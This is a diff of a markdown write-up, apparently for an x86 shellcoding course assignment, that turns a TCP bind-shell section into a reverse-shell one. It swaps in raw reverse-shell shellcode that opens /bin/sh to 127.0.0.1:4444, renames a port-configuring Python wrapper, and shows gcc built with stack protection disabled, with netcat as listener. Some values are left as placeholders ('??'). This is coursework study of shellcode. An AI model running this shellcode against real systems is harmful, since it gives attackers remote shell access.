@@ -600,14 +600,11 @@ uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sud
 #### Configurable Port (Customize Shellcode) 
 ------
 
-Objdump is used to extract the shellcode from the TCP bind shell in hex format (Null free):
+Objdump is used to extract the shellcode from the Reverse TCP shell in hex format (Null free):
 
 ```bash
-osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./shell_bind_tcp|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
-"\x31\xc0\x31\xdb\x31\xf6\x56\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\x56\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1
-\x6a\x16\x51\x52\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x6a\x01\x52\xb0\x66\xb3\x04\x89\xe1\xcd\x80\x56\x56\x52\xb0\x66\xb3\x05\x89
-\xe1\xcd\x80\x89\xc2\x31\xc9\xb1\x03\x89\xd3\x49\xb0\x3f\xcd\x80\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69
-\x89\xe3\x50\x89\xc2\x53\x89\xe1\xb0\x0b\xcd\x80"
+osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./reverse_shell_tcp|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\xbf\xff\xff\xff\xff\x81\xf7\x80\xff\xff\xfe\x57\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x16\x51\x52\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x89\xd3\x49\xb0\x3f\xcd\x80\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xc2\x53\x89\xe1\xb0\x0b\xcd\x80"
 ```
 
 Once the raw shellcode has been extracted, the last requirement to complete the assignment is to ensure the port number is easily configurable. 
@@ -619,10 +616,10 @@ The shellcode variable defined within the script includes the original hardcoded
 ```python
 #!/usr/bin/python
 
-# Filename: shell_bind_tcp_wrapper.py
+# Filename: reverse_shell_tcp_wrapper.py
 # Author: h3ll0clar1c3
-# Purpose: Wrapper script to generate dynamic shellcode, configurable bind port number
-# Usage: python shell_bind_tcp_wrapper.py <port>
+# Purpose: Wrapper script to generate dynamic shellcode, configurable port number
+# Usage: python reverse_shell_tcp_wrapper.py <port>
 
 import socket
 import sys
@@ -679,7 +676,7 @@ A simple C program scripted and edited with the newly generated shellcode:
 * Filename: shellcode.c
 * Author: h3ll0clar1c3
 * Purpose: Reverse shell connecting back to IP address 127.0.0.1 on TCP port 4444 
-* Compilation: gcc -fno-stack-protector -z execstack -m32 shellcode.c -o shell_bind_tcp_final  
+* Compilation: gcc -fno-stack-protector -z execstack -m32 shellcode.c -o reverse_shell_tcp_final  
 * Usage: ./reverse_shell_tcp_final
 * Testing: nc -lv 4444
 * Shellcode size: ??? bytes
@@ -713,9 +710,9 @@ unsigned char code[] =
 The C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 105 bytes:
 
 ```bash
-osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 shellcode.c -o shell_bind_tcp_final
-osboxes@osboxes:~/Downloads/SLAE$ ./shell_bind_tcp_final
-Shellcode length: 105
+osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 shellcode.c -o reverse_shell_tcp_final
+osboxes@osboxes:~/Downloads/SLAE$ ./reverse_shell_tcp_final
+Shellcode length: ??
 
 ```
 
